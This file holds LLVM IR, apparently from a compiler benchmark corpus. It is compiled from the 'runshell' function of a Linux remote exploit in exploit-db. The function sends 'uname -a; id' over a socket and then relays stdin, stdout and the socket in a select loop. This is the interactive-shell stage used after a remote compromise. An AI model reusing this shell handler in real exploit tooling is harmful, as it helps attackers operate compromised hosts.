; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_230.c_runshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_230.c_runshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [29 x i8] c"/bin/uname -a ; /usr/bin/id\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@STDOUT_FILENO = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @runshell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [4096 x i8], align 16
  %7 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  %8 = load i32, i32* %3, align 4
  %9 = load i8*, i8** %7, align 8
  %10 = load i8*, i8** %7, align 8
  %11 = call i32 @strlen(i8* %10)
  %12 = call i32 @send(i32 %8, i8* %9, i32 %11, i32 0)
  br label %13

13:                                               ; preds = %57, %1
  %14 = call i32 @FD_ZERO(i32* %4)
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @FD_SET(i32 %15, i32* %4)
  %17 = load i32, i32* @STDIN_FILENO, align 4
  %18 = call i32 @FD_SET(i32 %17, i32* %4)
  %19 = load i32, i32* %3, align 4
  %20 = add nsw i32 %19, 1
  %21 = call i32 @select(i32 %20, i32* %4, i32* null, i32* null, i32* null)
  store i32 %21, i32* %5, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp sle i32 %22, 0
  br i1 %23, label %24, label %25

24:                                               ; preds = %13
  store i32 -1, i32* %2, align 4
  br label %59

25:                                               ; preds = %13
  %26 = load i32, i32* %3, align 4
  %27 = call i64 @FD_ISSET(i32 %26, i32* %4)
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %41

29:                                               ; preds = %25
  %30 = load i32, i32* %3, align 4
  %31 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %32 = call i32 @recv(i32 %30, i8* %31, i32 4096, i32 0)
  store i32 %32, i32* %5, align 4
  %33 = load i32, i32* %5, align 4
  %34 = icmp sle i32 %33, 0
  br i1 %34, label %35, label %36

35:                                               ; preds = %29
  br label %58

36:                                               ; preds = %29
  %37 = load i32, i32* @STDOUT_FILENO, align 4
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %39 = load i32, i32* %5, align 4
  %40 = call i32 @write(i32 %37, i8* %38, i32 %39)
  br label %41

41:                                               ; preds = %36, %25
  %42 = load i32, i32* @STDIN_FILENO, align 4
  %43 = call i64 @FD_ISSET(i32 %42, i32* %4)
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %57

45:                                               ; preds = %41
  %46 = load i32, i32* @STDIN_FILENO, align 4
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %48 = call i32 @read(i32 %46, i8* %47, i32 4096)
  store i32 %48, i32* %5, align 4
  %49 = load i32, i32* %5, align 4
  %50 = icmp sle i32 %49, 0
  br i1 %50, label %51, label %52

51:                                               ; preds = %45
  br label %58

52:                                               ; preds = %45
  %53 = load i32, i32* %3, align 4
  %54 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %55 = load i32, i32* %5, align 4
  %56 = call i32 @send(i32 %53, i8* %54, i32 %55, i32 0)
  br label %57

57:                                               ; preds = %52, %41
  br label %13

58:                                               ; preds = %51, %35
  store i32 0, i32* %2, align 4
  br label %59

59:                                               ; preds = %58, %24
  %60 = load i32, i32* %2, align 4
  ret i32 %60
}

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
